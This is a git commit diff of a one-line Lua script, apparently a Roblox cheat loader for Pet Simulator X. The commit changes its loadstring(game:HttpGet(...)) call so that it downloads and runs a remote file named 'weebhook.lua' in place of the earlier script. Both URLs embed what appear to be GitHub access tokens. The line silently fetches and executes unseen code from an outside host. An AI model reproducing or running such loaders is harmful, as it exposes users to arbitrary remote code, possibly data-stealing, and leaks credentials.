b13fb235416a2b43ce54e2f10cd5a1fd68596b63
Adidsus <85895319+Adidsus@users.noreply.github.com>
2023-09-11 17:49:40 +0200

    Update petsimx.lua

--- petsimx.lua
+++ petsimx.lua
@@ -1,3 +1,3 @@
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/Qquae/main/petsimx.lua?token=GHSAT0AAAAAACFV6SIEBS7OEIPQI3O4EXS2ZH7FMFQ",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/Qquae/main/weebhook.lua?token=GHSAT0AAAAAACFV6SIER6T46QKW43M2WR7GZH7IUJA",true))()
 
